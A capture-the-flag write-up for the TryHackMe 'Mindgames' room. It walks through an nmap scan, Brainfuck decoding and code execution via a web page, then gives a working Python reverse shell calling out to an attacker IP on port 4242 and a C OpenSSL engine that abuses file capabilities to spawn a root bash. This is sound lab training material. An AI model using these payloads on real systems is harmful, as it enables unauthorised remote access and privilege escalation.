# 34 - Mindgames

Room Link --> [https://tryhackme.com/room/mindgames](https://tryhackme.com/room/mindgames)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -Pn -n -p- -T5 -sS -vv 10.10.139.95

PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    open     http    syn-ack ttl 63
```
{% endcode %}

Navigating to the Webpage. `http://10.10.139.95` .

<figure><img src=".gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

Pasting the cipher text after Hello World in google returned results that included "BrainFuck" programming language, though my initial thought was that this is a Morsecode cipher. So i used an onlide [Brainfuck decoder](https://www.dcode.fr/brainfuck-language)

<figure><img src=".gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

The next cipher text:

<figure><img src=".gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

#### Fibonacci

{% code overflow="wrap" lineNumbers="true" %}
```python
def F(n):
    if n <= 1:
        return 1
    return F(n-1)+F(n-2)


for i in range(10):
    print(F(i))
```
{% endcode %}

The webpage also runs the code automatically.

<figure><img src=".gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

Meaning we can convert our python code into Brainfuck language and run it in the dialog box.

So i wrote a python cmd to view the "id" of the user.

<figure><img src=".gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

Paste in the dialog box:

<figure><img src=".gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

Reading the "/home/mindgames" dir.

<figure><img src=".gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

### Initial access:

I used this to get shell access to the box.

{% code overflow="wrap" lineNumbers="true" %}
```bash
o = __import__('os')
s = __import__('socket')
p = __import__('subprocess')

k=s.socket(s.AF_INET,s.SOCK_STREAM)
k.connect(("10.18.88.214",4242))
o.dup2(k.fileno(),0)
o.dup2(k.fileno(),1)
o.dup2(k.fileno(),2)
c=p.call(["/bin/sh","-i"]);

# convert to Brainfuk, setup a nc listener.
nc -nvlp 4242
```
{% endcode %}

<figure><img src=".gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

\[getcap] exploitation.

I ran linPEAS on the box, and found OpenSSL that had capabilities set that allows us to change UID

<figure><img src=".gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

So i created a simple OpenSSL engine that when compile it will execute bash as root.

{% code title="shell.c" overflow="wrap" lineNumbers="true" %}
```c
#include <openssl/engine.h>
#include <unistd.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
}


IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
{% endcode %}

Compiling the code.

```bash
gcc -fPIC -c shell.c -o shell.o
gcc -shared -lcrypto shell.o -o shell.so

# transfer the shell.so file to the victim box.
```

Run the cmd below:

```bash
openssl engine -t `pwd`/shell.so

# and we get root.
```

<figure><img src=".gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

Done!
